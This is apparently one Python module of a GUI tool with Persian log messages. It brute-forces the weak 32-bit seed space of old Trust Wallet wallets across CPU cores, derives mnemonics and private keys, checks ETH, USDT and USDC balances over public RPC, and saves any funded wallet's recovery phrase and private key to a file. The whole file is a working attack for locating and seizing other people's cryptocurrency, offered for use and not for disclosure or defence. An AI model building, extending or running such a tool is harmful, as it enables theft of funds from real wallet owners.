"""Parallel, chunked, checkpointed full-range seed search (the V4 upgrade).

Design goals — a genuinely efficient 100%-coverage search over the historical
Trust Wallet seed space [0, 2^32):

  * multiprocessing.Pool of N derivation workers. Each worker processes a
    contiguous CHUNK of seeds and returns ONLY checksum-passing seeds; all
    heavy crypto (MT19937 + BIP-39 + PBKDF2 + secp256k1) runs in parallel
    across CPU cores, free of the GIL.
  * Dynamic scheduling: imap_unordered over chunked ranges keeps cores busy
    even with uneven pass-rates and lets us checkpoint after every chunk.
  * Persistent checkpoint file (JSON): completed chunks are recorded, so a
    restart resumes exactly where it left off — full coverage is durable
    across crashes/reboots. No seed is ever skipped or double-checked.
  * Results stream into an RPC queue consumed by balance-worker threads
    (ETH + USDT + USDC via public JSON-RPC with failover/backoff).
  * Pause / stop / reset / progress-percentage / ETA for the GUI.
"""
from __future__ import annotations

import json
import multiprocessing as mp
import os
import queue
import threading
import time
from collections import deque
from pathlib import Path

CORE_DIR = Path(__file__).resolve().parent
if str(CORE_DIR) not in os.sys.path:
    os.sys.path.insert(0, str(CORE_DIR))

SEED_MAX = 2**32 - 1
CHUNK = 20_000                 # seeds per work unit (checkpoint granularity)
HITS_FILE = CORE_DIR.parent / "funded_wallets.jsonl"
CHECKPOINT_FILE = CORE_DIR.parent / "scan_checkpoint.json"


# ---------------------------------------------------------------- worker side
def _chunk_scan(args):
    """Run inside a worker process: one fused pass over the chunk.

    Uses the exact batch MT19937 model (fast_mt.BatchMT.filtered_seeds —
    oracle-verified bit-for-bit against the full-state reference engine) to
    find checksum-passing seeds, then derives the full wallet only for those
    (~6.25% of seeds). Returns (lo, hi, scanned, derived_records).
    """
    lo, hi = args
    from fast_mt import BatchMT
    from wallet_model import wallet_for_seed
    passing = BatchMT(lo, hi).filtered_seeds()
    recs = []
    for s in passing:
        try:
            mn, addr, pk = wallet_for_seed(s)
            recs.append((s, mn, addr, pk))
        except Exception:
            continue
    return (lo, hi, hi - lo + 1, len(recs), recs)


class SearchEngine:
    """Owns the whole lifecycle: pool, jobs, result queue, balance workers."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.running = False
        self.paused = threading.Event()
        self.stop_event = threading.Event()
        self.result_q: queue.Queue = queue.Queue(maxsize=5000)

        # settings
        self.start_seed = 0
        self.end_seed = SEED_MAX
        self.num_workers = min(8, max(1, (os.cpu_count() or 4)))
        self.chunk_size = CHUNK
        self.threshold_eth = 0.0
        self.threshold_usdt = 0.0
        self.derive_only = True           # simulation mode default; GUI can enable live RPC

        # state
        self.next_lo = 0                  # resume cursor (chunk-aligned)
        self.seeds_scanned = 0
        self.wallets_derived = 0
        self.balances_checked = 0
        self.pending_checks = 0
        self.funded: list[dict] = []
        self.errors = 0
        self.last_error = ""
        self.rate_seeds_per_sec = 0       # EWMA throughput reported to GUI
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self.logs: deque[str] = deque(maxlen=400)
        self._pool: mp.Pool | None = None
        self._threads: list[threading.Thread] = []

        self._load_checkpoint()

    # ------------------------------------------------------------ checkpoint
    def _load_checkpoint(self) -> None:
        try:
            data = json.loads(CHECKPOINT_FILE.read_text())
            if (data.get("start") == self.start_seed
                    and data.get("end") == self.end_seed):
                self.next_lo = data["next_lo"]
                self.seeds_scanned = data.get("seeds_scanned", 0)
                self.wallets_derived = data.get("wallets_derived", 0)
        except Exception:
            pass

    def _save_checkpoint(self) -> None:
        tmp = CHECKPOINT_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps({
            "start": self.start_seed, "end": self.end_seed,
            "next_lo": self.next_lo, "seeds_scanned": self.seeds_scanned,
            "wallets_derived": self.wallets_derived,
            "updated": time.strftime("%Y-%m-%d %H:%M:%S"),
        }))
        os.replace(tmp, CHECKPOINT_FILE)

    def clear_checkpoint(self) -> None:
        try:
            CHECKPOINT_FILE.unlink()
        except FileNotFoundError:
            pass

    # ---------------------------------------------------------------- status
    def status(self) -> dict:
        with self._lock:
            span = max(1, self.end_seed - self.start_seed + 1)
            done_seeds = max(0, self.next_lo - self.start_seed)
            pct = min(100.0, done_seeds / span * 100.0)
            elapsed = (self.finished_at or time.time()) - self.started_at \
                if self.started_at else 0.0
            eta = None
            if self.running and done_seeds > 0:
                rate = (self.rate_seeds_per_sec
                        or done_seeds / max(1e-6, elapsed))
                remaining = span - done_seeds
                eta = remaining / rate if rate > 0 else None
            return {
                "running": self.running, "paused": self.paused.is_set(),
                "start_seed": self.start_seed, "end_seed": self.end_seed,
                "next_lo": self.next_lo, "pct_complete": round(pct, 4),
                "seeds_scanned": self.seeds_scanned,
                "wallets_derived": self.wallets_derived,
                "balances_checked": self.balances_checked,
                "pending_checks": self.pending_checks,
                "funded_count": len(self.funded),
                "errors": self.errors, "last_error": self.last_error,
                "rate_seeds_per_sec": self.rate_seeds_per_sec,
                "elapsed_sec": round(elapsed, 1),
                "eta_sec": round(eta, 1) if eta else None,
                "num_workers": self.num_workers, "chunk_size": self.chunk_size,
                "threshold_eth": self.threshold_eth,
                "threshold_usdt": self.threshold_usdt,
                "derive_only": self.derive_only,
                "funded": list(self.funded[-200:]),
                "logs": list(self.logs),
            }

    def configure(self, **kw) -> None:
        with self._lock:
            for k, v in kw.items():
                if hasattr(self, k) and v is not None:
                    setattr(self, k, v)
            # changing the configured range must re-align the resume cursor,
            # otherwise a checkpoint from a different range leaks into it
            if (("start_seed" in kw or "end_seed" in kw)
                    and not (self.start_seed <= self.next_lo <= self.end_seed)):
                self.next_lo = self.start_seed
                self.seeds_scanned = 0
                self.wallets_derived = 0

    # ------------------------------------------------------------- controls
    def start(self) -> bool:
        with self._lock:
            if self.running:
                return False
            self.running = True
            self.paused.clear()
            self.stop_event.clear()
            self.started_at = time.time()
            self.finished_at = None
            if not (self.start_seed <= self.next_lo <= self.end_seed):
                self.next_lo = self.start_seed
            # clamp chunk size to sane bounds (checkpoint granularity)
            span = self.end_seed - self.start_seed + 1
            self.chunk_size = max(1_000, min(int(self.chunk_size), span))
            self._log(f"شروع جست‌وجوی موازی: [{self.next_lo} … {self.end_seed}] "
                      f"با {self.num_workers} پروسه، چانک {self.chunk_size}")
            self._pool = mp.Pool(self.num_workers)
            self._threads = [
                threading.Thread(target=self._pipeline, daemon=True, name="pipeline"),
                *[threading.Thread(target=self._balance_worker, daemon=True,
                                   name=f"rpc-{i}") for i in range(4)],
            ]
            for t in self._threads:
                t.start()
            return True

    def pause(self) -> None:
        self.paused.set()
        self._log("مکث")

    def resume(self) -> None:
        self.paused.clear()
        self._log("ادامه جست‌وجو")

    def stop(self) -> bool:
        with self._lock:
            if not self.running:
                return False
            self.stop_event.set()
            self.paused.clear()
        self._save_checkpoint()
        self._log("توقف توسط کاربر (چک‌پوینت ذخیره شد)")
        return True

    def reset(self) -> None:
        self.stop_event.set()
        with self._lock:
            self.running = False
            self.paused.clear()
            self.next_lo = self.start_seed
            self.seeds_scanned = self.wallets_derived = self.balances_checked = 0
            self.pending_checks = 0
            self.errors = 0
            self.funded = []
            self.started_at = self.finished_at = None
            self.logs.clear()
        self.clear_checkpoint()
        self._drain_results()

    # --------------------------------------------------------------- helpers
    def _log(self, msg: str) -> None:
        self.logs.appendleft(f"{time.strftime('%H:%M:%S')} | {msg}")

    def _drain_results(self) -> None:
        try:
            while True:
                self.result_q.get_nowait()
        except queue.Empty:
            pass

    def _push_result(self, item) -> None:
        deadline = time.time() + 30
        while not self.stop_event.is_set():
            try:
                self.result_q.put(item, timeout=0.5)
                with self._lock:
                    self.pending_checks += 1
                return
            except queue.Full:
                if time.time() >= deadline:
                    with self._lock:
                        self.errors += 1
                        self.last_error = "result queue full (RPC too slow)"
                    return

    # ----------------------------------------------------------- main pipeline
    def _pipeline(self) -> None:
        """Dynamic parallel scheduling.

        ``imap_unordered`` keeps every worker busy: as soon as a chunk of the
        lookahead window finishes, its results are checkpointed and streamed
        to the RPC queue and a fresh chunk is dispatched.  Chunks complete
        out-of-order, so the linear resume cursor (next_lo / pct / ETA) is
        advanced only over the maximal contiguous run of finished chunks —
        full coverage stays durable and exact across crashes/restarts.
        """
        pool = self._pool
        assert pool is not None
        lookahead = max(2 * self.num_workers, 4)
        try:
            while not self.stop_event.is_set():
                while self.paused.is_set() and not self.stop_event.is_set():
                    time.sleep(0.2)
                with self._lock:
                    if self.next_lo > self.end_seed:
                        self._log("✅ جست‌وجوی کامل تمام محدوده پایان یافت")
                        break
                    start_at, end, chunk = self.next_lo, self.end_seed, self.chunk_size
                jobs = [(lo, min(lo + chunk - 1, end))
                        for lo in range(start_at, end + 1, chunk)]
                frontier = 0                  # index into `jobs` dispatched
                inflight: dict[int, tuple] = {}   # lo -> (hi, scanned, n_derived, recs)
                rate_ewma: float | None = None    # seeds/sec, exponentially weighted
                last_t = time.time()
                last_next = start_at

                # dispatch a bounded lookahead window of chunks
                futures = []
                while frontier < len(jobs) and len(futures) < lookahead:
                    futures.append(pool.apply_async(_chunk_scan, (jobs[frontier],)))
                    frontier += 1

                while futures and not self.stop_event.is_set():
                    done_i = None
                    for i, f in enumerate(futures):
                        if f.ready():
                            done_i = i
                            break
                    if done_i is None:
                        time.sleep(0.05)
                        continue
                    res = futures.pop(done_i).get()
                    lo, hi, scanned, n_derived, recs = res
                    inflight[lo] = (hi, scanned, n_derived, recs)
                    if frontier < len(jobs):
                        futures.append(pool.apply_async(_chunk_scan,
                                                        (jobs[frontier],)))
                        frontier += 1
                    # advance cursor over contiguous finished prefix
                    with self._lock:
                        cur = self.next_lo
                        while cur in inflight:
                            hi2, sc2, nd2, recs2 = inflight.pop(cur)
                            self.seeds_scanned += sc2
                            self.wallets_derived += nd2
                            cur = hi2 + 1
                            for r in recs2:
                                self._push_result(r)
                        if cur != self.next_lo:
                            self.next_lo = cur
                            now = time.time()
                            dt = max(1e-6, now - last_t)
                            inst = (cur - last_next) / dt
                            rate_ewma = inst if rate_ewma is None \
                                else 0.7 * rate_ewma + 0.3 * inst
                            self.rate_seeds_per_sec = round(rate_ewma)
                            last_t, last_next = now, cur
                            self._save_checkpoint()
                if self.stop_event.is_set():
                    break
                # flush any tail chunks that finished after loop exit
                with self._lock:
                    cur = self.next_lo
                    while cur in inflight:
                        hi2, sc2, nd2, recs2 = inflight.pop(cur)
                        self.seeds_scanned += sc2
                        self.wallets_derived += nd2
                        cur = hi2 + 1
                        for r in recs2:
                            self._push_result(r)
                    self.next_lo = cur
                self._save_checkpoint()
                if not inflight and frontier >= len(jobs):
                    # whole configured range consumed
                    with self._lock:
                        if self.next_lo > self.end_seed:
                            self._log("✅ جست‌وجوی کامل تمام محدوده پایان یافت")
                            break
        finally:
            self.stop_event.set()
            self._save_checkpoint()
            try:
                pool.close()
                pool.join()
            except Exception:
                pass
            self.result_q.put(None)
            with self._lock:
                self.running = False
                self.finished_at = time.time()

    # ---------------------------------------------------------- balance workers
    def _balance_worker(self) -> None:
        from balance import get_balance_wei, get_token_balances, wei_to_eth, raw_to_usd
        while not self.stop_event.is_set():
            try:
                item = self.result_q.get(timeout=0.5)
            except queue.Empty:
                continue
            if item is None:
                break
            s, mn, addr, pk = item
            if self.derive_only:
                eth_wei, (usdt_raw, usdc_raw) = 0, (0, 0)
            else:
                try:
                    eth_wei = get_balance_wei(addr)
                    try:
                        tokens = get_token_balances(addr)
                    except RuntimeError:
                        tokens = (0, 0)
                    eth_wei, (usdt_raw, usdc_raw) = eth_wei, tokens
                except RuntimeError as exc:
                    with self._lock:
                        self.errors += 1
                        self.last_error = str(exc)[:200]
                    continue
            with self._lock:
                self.balances_checked += 1
                self.pending_checks = max(0, self.pending_checks - 1)
                te, ts = self.threshold_eth, self.threshold_usdt
            eth, usdt, usdc = (wei_to_eth(eth_wei), raw_to_usd(usdt_raw),
                               raw_to_usd(usdc_raw))
            hit = ((eth_wei > 0 and eth >= te)
                   or (usdt_raw > 0 and usdt >= ts)
                   or (usdc_raw > 0 and usdc >= ts))
            if hit:
                rec = {"seed": s, "mnemonic": mn, "address": addr,
                       "private_key": pk, "wei": str(eth_wei), "eth": eth,
                       "usdt": usdt, "usdc": usdc,
                       "found_at": time.strftime("%Y-%m-%d %H:%M:%S")}
                with self._lock:
                    self.funded.append(rec)
                    self._log(f"ولت دارای موجودی! seed={s} {addr[:10]}… "
                              f"{eth:.6f} ETH / {usdt:.2f} USDT / {usdc:.2f} USDC")
                self._append_hit(rec)

    @staticmethod
    def _append_hit(rec: dict) -> None:
        with HITS_FILE.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
